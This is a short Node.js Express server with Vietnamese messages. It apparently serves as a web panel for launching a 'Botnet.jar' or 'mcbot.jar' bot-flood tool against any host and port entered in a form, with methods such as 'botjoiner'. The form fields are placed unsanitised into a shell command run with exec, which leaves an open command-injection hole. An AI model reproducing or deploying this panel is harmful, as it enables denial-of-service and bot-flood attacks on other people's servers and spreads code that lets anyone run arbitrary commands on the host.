const express = require('express');
const { exec } = require('child_process');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', (req, res) => {
  const { host, port, method, launcher } = req.body;

  if (!host || !port || !method || !launcher) {
    return res.status(400).send("❌ Vui lòng nhập đầy đủ thông tin.");
  }

  let cmd;

  if (launcher === 'LT1') {
    cmd = `java -jar Botnet.jar ${host}:${port} 340 ${method} 300 5000`;
  } else if (launcher === 'LT2' && method === 'botjoiner') {
    cmd = `java -jar mcbot.jar ${host}:${port} 340 ${method} 300 5000`;
  } else {
    return res.status(400).send("❌ Phương thức không hợp lệ cho LT2.");
  }

  console.log("👉 Chạy lệnh:", cmd);

  exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
    let output = `✅ Đã chạy lệnh:\n${cmd}\n\n--- Kết quả ---\n`;

    if (stdout) output += stdout.trim() + "\n";
    if (stderr) output += "\n⚠️ Cảnh báo/ lỗi:\n" + stderr.trim() + "\n";

    if (err) {
      console.error("❌ Lỗi khi chạy lệnh:", err.message);
      output += `\n❌ Lỗi:\n${err.message}`;
      return res.status(500).send(output);
    }

    console.log("✅ Kết quả trả về:\n", stdout);
    res.send(output);
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server chạy tại: http://localhost:${PORT}`);
});
